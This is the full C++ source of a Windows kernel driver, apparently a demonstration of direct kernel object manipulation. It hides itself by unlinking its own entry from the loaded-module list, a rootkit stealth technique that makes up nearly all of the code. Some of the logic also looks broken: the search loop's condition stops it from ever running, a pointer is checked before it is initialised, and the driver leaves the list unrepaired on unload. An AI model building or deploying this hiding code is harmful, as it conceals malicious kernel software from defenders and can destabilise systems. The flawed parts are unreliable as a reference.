#include <ntifs.h>
#include <ntddk.h>

// local includes
#include "KernelObjectHelpers.h"

// prototypes
void DriverUnload(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS DriverUnlink(_In_ PDRIVER_OBJECT DriverObject, PUNICODE_STRING DriverName);
NTSTATUS FindKernelModule(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING DriverName);

// Driver entry point
extern "C"
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);

	DriverObject->DriverUnload = DriverUnload;

	// Create the Device Object and Device Name
	UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\DKOM_Driver");
	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(
		DriverObject,
		0,
		&DeviceName,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&DeviceObject);

	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create device object (0x%08X)\n", status));

		// in case a device object was actually created
		if (DeviceObject)
			IoDeleteDevice(DeviceObject);

		return status;
	}

	// create the symbolic link
	UNICODE_STRING SymbolicLink = RTL_CONSTANT_STRING(L"\\DosDevices\\DKOM_Driver");
	status = IoCreateSymbolicLink(&SymbolicLink, &DeviceName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create symbolic link (0x%08X)\n", status));
		IoDeleteDevice(DeviceObject);
		return status;
	}

	// invoke driver hiding logic
	UNICODE_STRING DriverName = RTL_CONSTANT_STRING(L"dkom_demo.sys");
	status = DriverUnlink(DriverObject, &DriverName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to unlink the driver: (0x%08X)\n", status));
		IoDeleteDevice(DeviceObject);
		return status;
	}
	KdPrint(("Successfully unlinked the driver.\n"));

	// set the flags to reflect state
	DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
	DeviceObject->Flags |= DO_DIRECT_IO;

	return STATUS_SUCCESS;
}

NTSTATUS DriverUnlink(_In_ PDRIVER_OBJECT DriverObject, PUNICODE_STRING DriverName) {
	// Initialize the three relevent list entries
	PKLDR_DATA_TABLE_ENTRY ThisModuleDataTable = (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
	PLIST_ENTRY ThisModule = &ThisModuleDataTable->InLoadOrderLinks;
	if (!ThisModule)
		return STATUS_UNSUCCESSFUL;

	PLIST_ENTRY PrevModule = ThisModule->Blink;
	PLIST_ENTRY NextModule = ThisModule->Flink;

	// Replace PrevModule Flink with NextModule's address;
	PrevModule->Flink = NextModule;
	// Replace NextModule Blink with PrevModule's address
	NextModule->Blink = PrevModule;

	NTSTATUS status = FindKernelModule(DriverObject, DriverName);
	if (NT_SUCCESS(status)) {
		return STATUS_UNSUCCESSFUL;
	}

	return STATUS_SUCCESS;
}

NTSTATUS FindKernelModule(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING DriverName) {
	// Logic can be similarly used for finding the PsLoadedModuleList head. ntoskrnl.exe is always the head
	PKLDR_DATA_TABLE_ENTRY pThisModule = (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
	PLIST_ENTRY KModEntry = { nullptr };
	PLIST_ENTRY FirstEntry = pThisModule->InLoadOrderLinks.Flink;

	// https://m0uk4.gitbook.io/notebooks/mouka/windowsinternal/find-kernel-module-address-todo
	// Get PsLoadedModuleList address
	for (PLIST_ENTRY pListEntry = pThisModule->InLoadOrderLinks.Flink;
		(pListEntry != &pThisModule->InLoadOrderLinks) &
		(pThisModule->InLoadOrderLinks.Flink != FirstEntry);
		pListEntry = pListEntry->Flink)
	{
		// Search for Ntoskrnl entry
		PKLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(
			pListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		if (RtlEqualUnicodeString(DriverName, &pEntry->BaseDllName, true)) {
			// Ntoskrnl is always the first entry in the list
			// so the previous entry is the PsLoadedModuleList
			// check if the found pointer belongs to Ntoskrnl module
			KModEntry = pListEntry;
			return STATUS_SUCCESS;
		}
	}

	return STATUS_UNSUCCESSFUL;
}

void DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\DKOM_Driver");
	// delete symbolic link
	IoDeleteSymbolicLink(&symLink);

	// delete device object
	IoDeleteDevice(DriverObject->DeviceObject);
}

